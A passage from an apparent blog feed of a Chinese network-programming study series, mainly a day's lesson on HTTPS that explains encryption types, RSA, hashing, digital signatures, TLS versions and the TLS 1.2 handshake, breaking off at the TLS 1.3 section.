title="下周准备"></a>下周准备</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">第四周将学习网络层协议：<br><br>预习内容：<br><span class="hljs-bullet">- </span>IP地址和子网<br><span class="hljs-bullet">- </span>IPv4 vs IPv6<br><span class="hljs-bullet">- </span>路由原理<br><span class="hljs-bullet">- </span>ICMP协议<br><br>准备工具：<br><span class="hljs-bullet">- </span>Wireshark<br><span class="hljs-bullet">- </span>tcpdump<br><span class="hljs-bullet">- </span>ping、traceroute<br><span class="hljs-bullet">- </span>iptables<br></code></pre></td></tr></table></figure><hr><p><strong>继续加油！</strong> 🚀</p><p>三周的学习让你已经打下了坚实的基础，从物理层、数据链路层，到网络基础，再到传输层和应用层，你已经掌握了网络编程的核心知识。下周我们将深入网络层，学习IP协议和路由原理，这将让你对网络有更全面的理解！</p><p><strong>进度：21&#x2F;180天（11.7%）</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>20天：HTTPS和安全</title>
    <link href="/2025/11/10/20%E5%A4%A9%EF%BC%9AHTTPS%E5%92%8C%E5%AE%89%E5%85%A8/"/>
    <url>/2025/11/10/20%E5%A4%A9%EF%BC%9AHTTPS%E5%92%8C%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="第20天：HTTPS和安全"><a href="#第20天：HTTPS和安全" class="headerlink" title="第20天：HTTPS和安全"></a>第20天：HTTPS和安全</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解HTTPS的工作原理</li><li>掌握对称加密和非对称加密</li><li>学习TLS&#x2F;SSL协议</li><li>了解数字证书和CA</li><li>理解HTTPS握手过程</li><li>学习常见Web安全攻击和防御</li><li>实现简单的HTTPS服务器</li></ul><hr><h2 id="1-为什么需要HTTPS？"><a href="#1-为什么需要HTTPS？" class="headerlink" title="1. 为什么需要HTTPS？"></a>1. 为什么需要HTTPS？</h2><h3 id="1-1-HTTP的安全问题"><a href="#1-1-HTTP的安全问题" class="headerlink" title="1.1 HTTP的安全问题"></a>1.1 HTTP的安全问题</h3><p><strong>HTTP是明文传输</strong>：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nix">问题场景：<br><br>你在咖啡厅使用公共WiFi登录网站<br>输入用户名：alice<br>输入密码：mypassword123<br><br>HTTP传输：<br>POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> example.com<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;alice&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;mypassword123&quot;</span>&#125;<br><br>危险：<br>❌ 任何人都可以截获这个数据包<br>❌ 密码被明文看到<br>❌ 可以被篡改<br>❌ 无法验证服务器身份<br></code></pre></td></tr></table></figure><p><strong>HTTP的三大安全威胁</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 窃听（Eavesdropping）<br><span class="hljs-bullet">   -</span> 攻击者截获数据包<br><span class="hljs-bullet">   -</span> 读取敏感信息<br><span class="hljs-bullet">   -</span> 密码、信用卡号等<br><br><span class="hljs-bullet">2.</span> 篡改（Tampering）<br><span class="hljs-bullet">   -</span> 中间人修改数据<br><span class="hljs-bullet">   -</span> 注入恶意代码<br><span class="hljs-bullet">   -</span> 篡改交易金额<br><br><span class="hljs-bullet">3.</span> 冒充（Impersonation）<br><span class="hljs-bullet">   -</span> 伪装成合法服务器<br><span class="hljs-bullet">   -</span> 钓鱼攻击<br><span class="hljs-bullet">   -</span> 盗取用户信息<br></code></pre></td></tr></table></figure><h3 id="1-2-HTTPS的解决方案"><a href="#1-2-HTTPS的解决方案" class="headerlink" title="1.2 HTTPS的解决方案"></a>1.2 HTTPS的解决方案</h3><p><strong>HTTPS &#x3D; HTTP + TLS&#x2F;SSL</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTPS的三大保证：<br><br><span class="hljs-bullet">1.</span> 机密性（Confidentiality）<br>   ✅ 加密传输<br>   ✅ 无法窃听<br><br><span class="hljs-bullet">2.</span> 完整性（Integrity）<br>   ✅ 防止篡改<br>   ✅ 数据验证<br><br><span class="hljs-bullet">3.</span> 身份认证（Authentication）<br>   ✅ 验证服务器身份<br>   ✅ 防止冒充<br><br>实现方式：<br><span class="hljs-bullet">-</span> 对称加密：加密数据<br><span class="hljs-bullet">-</span> 非对称加密：交换密钥<br><span class="hljs-bullet">-</span> 数字证书：验证身份<br><span class="hljs-bullet">-</span> 消息摘要：验证完整性<br></code></pre></td></tr></table></figure><hr><h2 id="2-加密基础"><a href="#2-加密基础" class="headerlink" title="2. 加密基础"></a>2. 加密基础</h2><h3 id="2-1-对称加密"><a href="#2-1-对称加密" class="headerlink" title="2.1 对称加密"></a>2.1 对称加密</h3><p><strong>概念</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">对称加密 = 加密和解密使用相同的密钥<br><br>生活类比：<br>保险箱：<br><span class="hljs-bullet">-</span> 一把钥匙<br><span class="hljs-bullet">-</span> 用它锁门<br><span class="hljs-bullet">-</span> 用它开门<br><br>Alice → Bob：<br><span class="hljs-bullet">1.</span> Alice有密钥K<br><span class="hljs-bullet">2.</span> Alice用K加密消息<br><span class="hljs-bullet">3.</span> Bob用K解密消息<br><span class="hljs-bullet">4.</span> 前提：Alice和Bob都知道K<br></code></pre></td></tr></table></figure><p><strong>常见算法</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">AES（Advanced Encryption Standard）<br><span class="hljs-bullet">- </span>最常用<br><span class="hljs-bullet">- </span>速度快<br><span class="hljs-bullet">- </span>安全性高<br><span class="hljs-bullet">- </span>密钥长度：128/192/256位<br><br>DES（Data Encryption Standard）<br><span class="hljs-bullet">- </span>已被淘汰<br><span class="hljs-bullet">- </span>密钥太短（56位）<br><span class="hljs-bullet">- </span>不安全<br><br>3DES（Triple DES）<br><span class="hljs-bullet">- </span>DES的加强版<br><span class="hljs-bullet">- </span>使用三次DES<br><span class="hljs-bullet">- </span>逐渐被AES取代<br><br>ChaCha20<br><span class="hljs-bullet">- </span>移动设备友好<br><span class="hljs-bullet">- </span>Google推荐<br><span class="hljs-bullet">- </span>速度快<br></code></pre></td></tr></table></figure><p><strong>工作模式</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ECB（Electronic Codebook）<br><span class="hljs-bullet">- </span>最简单<br><span class="hljs-bullet">- </span>不安全（相同明文→相同密文）<br><span class="hljs-bullet">- </span>不推荐<br><br>CBC（Cipher Block Chaining）<br><span class="hljs-bullet">- </span>常用<br><span class="hljs-bullet">- </span>每个块依赖前一个块<br><span class="hljs-bullet">- </span>需要初始向量（IV）<br><br>GCM（Galois/Counter Mode）<br><span class="hljs-bullet">- </span>推荐<br><span class="hljs-bullet">- </span>认证加密<br><span class="hljs-bullet">- </span>TLS 1.3使用<br></code></pre></td></tr></table></figure><p><strong>对称加密的问题</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">密钥分发问题：<br><br>Alice想和Bob通信：<br><span class="hljs-bullet">1.</span> Alice生成密钥K<br><span class="hljs-bullet">2.</span> 如何安全地把K传给Bob？<br><span class="hljs-bullet">   -</span> 网络传输？不安全，会被截获<br><span class="hljs-bullet">   -</span> 线下交换？不现实<br><br>多人通信问题：<br>n个人两两通信<br>需要 n×(n-1)/2 个密钥<br>100个人 → 4950个密钥 ❌<br></code></pre></td></tr></table></figure><h3 id="2-2-非对称加密"><a href="#2-2-非对称加密" class="headerlink" title="2.2 非对称加密"></a>2.2 非对称加密</h3><p><strong>概念</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">非对称加密 = 公钥加密，私钥解密<br><br>密钥对：<br><span class="hljs-bullet">- </span>公钥（Public Key）：公开的，任何人都可以用<br><span class="hljs-bullet">- </span>私钥（Private Key）：私密的，只有自己知道<br><br>关系：<br><span class="hljs-bullet">- </span>公钥加密 → 私钥解密<br><span class="hljs-bullet">- </span>私钥加密 → 公钥解密<br><br>生活类比：<br>邮箱：<br><span class="hljs-bullet">- </span>邮箱口（公钥）：任何人都能投信<br><span class="hljs-bullet">- </span>邮箱钥匙（私钥）：只有主人能取信<br></code></pre></td></tr></table></figure><p><strong>RSA算法</strong>：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs excel">RSA（Rivest-Shamir-Adleman）<br><br>密钥生成：<br><span class="hljs-number">1</span>. 选择两个大质数 p 和 q<br><span class="hljs-number">2</span>. 计算 <span class="hljs-built_in">n</span> = p × q<br><span class="hljs-number">3</span>. 计算 φ(<span class="hljs-built_in">n</span>) = (p-<span class="hljs-number">1</span>) × (q-<span class="hljs-number">1</span>)<br><span class="hljs-number">4</span>. 选择 e（公钥指数），通常是 <span class="hljs-number">65537</span><br><span class="hljs-number">5</span>. 计算 d（私钥指数），满足 e×d ≡ <span class="hljs-number">1</span> (<span class="hljs-built_in">mod</span> φ(<span class="hljs-built_in">n</span>))<br><br>公钥：(<span class="hljs-built_in">n</span>, e)<br>私钥：(<span class="hljs-built_in">n</span>, d)<br><br>加密：c = m^e <span class="hljs-built_in">mod</span> <span class="hljs-built_in">n</span><br>解密：m = c^d <span class="hljs-built_in">mod</span> <span class="hljs-built_in">n</span><br><br>密钥长度：<br>- <span class="hljs-number">1024</span>位（不再安全）<br>- <span class="hljs-number">2048</span>位（当前推荐）<br>- <span class="hljs-number">4096</span>位（更安全，但慢）<br></code></pre></td></tr></table></figure><p><strong>使用场景</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 数字签名<br><span class="hljs-bullet">   -</span> 私钥签名<br><span class="hljs-bullet">   -</span> 公钥验证<br><span class="hljs-bullet">   -</span> 证明身份<br><br><span class="hljs-bullet">2.</span> 密钥交换<br><span class="hljs-bullet">   -</span> 用公钥加密对称密钥<br><span class="hljs-bullet">   -</span> 私钥解密得到对称密钥<br><span class="hljs-bullet">   -</span> 后续使用对称加密通信<br><br><span class="hljs-bullet">3.</span> 数字证书<br><span class="hljs-bullet">   -</span> CA用私钥签名证书<br><span class="hljs-bullet">   -</span> 浏览器用公钥验证<br></code></pre></td></tr></table></figure><p><strong>非对称加密的问题</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">速度慢：<br><span class="hljs-bullet">-</span> 比对称加密慢100-1000倍<br><span class="hljs-bullet">-</span> 不适合加密大量数据<br><br>解决方案（混合加密）：<br><span class="hljs-bullet">1.</span> 非对称加密：交换对称密钥（只用一次）<br><span class="hljs-bullet">2.</span> 对称加密：加密实际数据（快速）<br></code></pre></td></tr></table></figure><h3 id="2-3-哈希函数"><a href="#2-3-哈希函数" class="headerlink" title="2.3 哈希函数"></a>2.3 哈希函数</h3><p><strong>概念</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">哈希函数 = 单向函数，不可逆<br><br>特点：<br><span class="hljs-bullet">- </span>任意长度输入 → 固定长度输出<br><span class="hljs-bullet">- </span>相同输入 → 相同输出<br><span class="hljs-bullet">- </span>不同输入 → 几乎不可能相同输出<br><span class="hljs-bullet">- </span>无法从输出推导输入（单向）<br><br>用途：<br><span class="hljs-bullet">- </span>验证数据完整性<br><span class="hljs-bullet">- </span>密码存储<br><span class="hljs-bullet">- </span>数字签名<br></code></pre></td></tr></table></figure><p><strong>常见算法</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MD5（Message Digest 5）<br><span class="hljs-bullet">- </span>128位（16字节）<br><span class="hljs-bullet">- </span>已被破解<br><span class="hljs-bullet">- </span>不再安全<br><span class="hljs-bullet">- </span>只用于非安全场景（文件校验）<br><br>SHA-1（Secure Hash Algorithm 1）<br><span class="hljs-bullet">- </span>160位（20字节）<br><span class="hljs-bullet">- </span>已被破解<br><span class="hljs-bullet">- </span>Google已弃用<br><br>SHA-2家族<br><span class="hljs-bullet">- </span>SHA-224、SHA-256、SHA-384、SHA-512<br><span class="hljs-bullet">- </span>推荐使用SHA-256<br><span class="hljs-bullet">- </span>安全<br><br>SHA-3<br><span class="hljs-bullet">- </span>最新标准<br><span class="hljs-bullet">- </span>更安全<br><span class="hljs-bullet">- </span>尚未广泛使用<br><br>示例：<br>输入：Hello World<br>SHA-256：a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e<br></code></pre></td></tr></table></figure><h3 id="2-4-数字签名"><a href="#2-4-数字签名" class="headerlink" title="2.4 数字签名"></a>2.4 数字签名</h3><p><strong>原理</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">数字签名 = 证明消息来自特定发送者<br><br>步骤：<br><span class="hljs-bullet">1.</span> Alice计算消息的哈希值<br><span class="hljs-bullet">2.</span> Alice用私钥加密哈希值（签名）<br><span class="hljs-bullet">3.</span> Alice发送：消息 + 签名<br><br>验证：<br><span class="hljs-bullet">1.</span> Bob收到：消息 + 签名<br><span class="hljs-bullet">2.</span> Bob用Alice的公钥解密签名，得到哈希值H1<br><span class="hljs-bullet">3.</span> Bob计算消息的哈希值H2<br><span class="hljs-bullet">4.</span> 比较H1和H2<br><span class="hljs-bullet">   -</span> 相同：签名有效<br><span class="hljs-bullet">   -</span> 不同：被篡改或伪造<br><br>作用：<br>✅ 身份认证：确认发送者<br>✅ 完整性：消息未被篡改<br>✅ 不可否认：发送者无法否认<br></code></pre></td></tr></table></figure><hr><h2 id="3-TLS-SSL协议"><a href="#3-TLS-SSL协议" class="headerlink" title="3. TLS&#x2F;SSL协议"></a>3. TLS&#x2F;SSL协议</h2><h3 id="3-1-SSL-vs-TLS"><a href="#3-1-SSL-vs-TLS" class="headerlink" title="3.1 SSL vs TLS"></a>3.1 SSL vs TLS</h3><p><strong>历史</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">SSL（Secure Sockets Layer）<br><span class="hljs-bullet">- </span>1994: SSL 1.0（未发布）<br><span class="hljs-bullet">- </span>1995: SSL 2.0（有严重漏洞）<br><span class="hljs-bullet">- </span>1996: SSL 3.0<br><br>TLS（Transport Layer Security）<br><span class="hljs-bullet">- </span>1999: TLS 1.0（基于SSL 3.0）<br><span class="hljs-bullet">- </span>2006: TLS 1.1<br><span class="hljs-bullet">- </span>2008: TLS 1.2（当前主流）<br><span class="hljs-bullet">- </span>2018: TLS 1.3（最新）<br><br>关系：<br>TLS是SSL的升级版<br>习惯上仍称为SSL<br>但实际上都是TLS<br></code></pre></td></tr></table></figure><p><strong>版本对比</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs">┌──────────┬──────────┬──────────┬──────────┐<br>│  版本    │   状态   │   安全性 │   性能   │<br>├──────────┼──────────┼──────────┼──────────┤<br>│ SSL 2.0  │   禁用   │    低    │    差    │<br>│ SSL 3.0  │   禁用   │    低    │    差    │<br>│ TLS 1.0  │   弃用   │    中    │    中    │<br>│ TLS 1.1  │   弃用   │    中    │    中    │<br>│ TLS 1.2  │  推荐    │    高    │    中    │<br>│ TLS 1.3  │  最新    │   最高   │    高    │<br>└──────────┴──────────┴──────────┴──────────┘<br><br>推荐：<br>只使用TLS 1.2和TLS 1.3<br>禁用所有SSL和旧版TLS<br></code></pre></td></tr></table></figure><h3 id="3-2-TLS协议栈"><a href="#3-2-TLS协议栈" class="headerlink" title="3.2 TLS协议栈"></a>3.2 TLS协议栈</h3><p><strong>分层结构</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">┌─────────────────────────────────┐<br>│        应用层（HTTP等）          │<br>├─────────────────────────────────┤<br>│      TLS Handshake Protocol     │  握手协议<br>├─────────────────────────────────┤<br>│   TLS Change Cipher Spec        │  切换密码协议<br>├─────────────────────────────────┤<br>│      TLS Alert Protocol         │  警报协议<br>├─────────────────────────────────┤<br>│      TLS Record Protocol        │  记录协议<br>├─────────────────────────────────┤<br>│           TCP                   │<br>└─────────────────────────────────┘<br><br>记录协议（Record Protocol）：<br><span class="hljs-bullet">- </span>分段、压缩、加密、认证<br><span class="hljs-bullet">- </span>传输加密数据<br><br>握手协议（Handshake Protocol）：<br><span class="hljs-bullet">- </span>协商加密算法<br><span class="hljs-bullet">- </span>交换密钥<br><span class="hljs-bullet">- </span>验证身份<br></code></pre></td></tr></table></figure><hr><h2 id="4-HTTPS握手过程"><a href="#4-HTTPS握手过程" class="headerlink" title="4. HTTPS握手过程"></a>4. HTTPS握手过程</h2><h3 id="4-1-TLS-1-2-握手（RSA）"><a href="#4-1-TLS-1-2-握手（RSA）" class="headerlink" title="4.1 TLS 1.2 握手（RSA）"></a>4.1 TLS 1.2 握手（RSA）</h3><p><strong>完整流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs markdown">客户端                                  服务器<br><br><span class="hljs-bullet">1.</span> ClientHello<br>   ───────────────────────────────&gt;<br><span class="hljs-bullet">   -</span> 支持的TLS版本<br><span class="hljs-bullet">   -</span> 支持的加密套件<br><span class="hljs-bullet">   -</span> 随机数（Client Random）<br><br><span class="hljs-bullet">2.</span> ServerHello<br>   &lt;───────────────────────────────<br><span class="hljs-bullet">   -</span> 选择的TLS版本<br><span class="hljs-bullet">   -</span> 选择的加密套件<br><span class="hljs-bullet">   -</span> 随机数（Server Random）<br><br><span class="hljs-bullet">3.</span> Certificate（证书）<br>   &lt;───────────────────────────────<br><span class="hljs-bullet">   -</span> 服务器的数字证书<br><span class="hljs-bullet">   -</span> 包含公钥<br><br><span class="hljs-bullet">4.</span> ServerHelloDone<br>   &lt;───────────────────────────────<br><br><span class="hljs-bullet">5.</span> 验证证书<br><span class="hljs-bullet">   -</span> 检查证书有效性<br><span class="hljs-bullet">   -</span> 验证CA签名<br><span class="hljs-bullet">   -</span> 检查域名匹配<br><br><span class="hljs-bullet">6.</span> ClientKeyExchange<br>   ───────────────────────────────&gt;<br><span class="hljs-bullet">   -</span> 生成预主密钥（Pre-Master Secret）<br><span class="hljs-bullet">   -</span> 用服务器公钥加密<br><span class="hljs-bullet">   -</span> 发送给服务器<br><br><span class="hljs-bullet">7.</span> 双方计算<br>   客户端和服务器都计算：<br>   主密钥（Master Secret）= PRF(<br><span class="hljs-code">       Pre-Master Secret,</span><br><span class="hljs-code">       Client Random,</span><br><span class="hljs-code">       Server Random</span><br><span class="hljs-code">   )</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">8.</span> ChangeCipherSpec<br>   ───────────────────────────────&gt;<br><span class="hljs-bullet">   -</span> 通知：后续使用加密通信<br><br><span class="hljs-bullet">9.</span> Finished（加密）<br>   ───────────────────────────────&gt;<br><span class="hljs-bullet">   -</span> 加密的握手消息摘要<br><br><span class="hljs-bullet">10.</span> ChangeCipherSpec<br><span class="hljs-code">    &lt;───────────────────────────────</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">11.</span> Finished（加密）<br><span class="hljs-code">    &lt;───────────────────────────────</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">12.</span> 应用数据（加密）<br><span class="hljs-code">    &lt;══════════════════════════════&gt;</span><br><span class="hljs-code"></span><br>握手完成！<br>RTT（往返时间）：2-RTT<br></code></pre></td></tr></table></figure><p><strong>密钥推导</strong>：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">材料：<br>- Client Random（客户端随机数）<br>- Server Random（服务器随机数）<br>- Pre-<span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span>（预主密钥，<span class="hljs-number">48</span>字节）<br><br>计算：<br><span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span> = PRF(<br>    Pre-<span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span>,<br>    <span class="hljs-string">&quot;master secret&quot;</span>,<br>    Client Random + Server Random<br>)<br><br>从<span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span>派生：<br>- 客户端加密密钥<br>- 服务器加密密钥<br>- 客户端MAC密钥<br>- 服务器MAC密钥<br>- 客户端IV<br>- 服务器IV<br></code></pre></td></tr></table></figure><h3 id="4-2-TLS-1-3-握手（优化）"><a href="#4-2-TLS-1-3-握手（优化）" class="headerlink" title="4.2 TLS 1.3 握手（优化）"></a>4.2 TLS 1.3 握手（优化）</h3><p><strong>改进</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 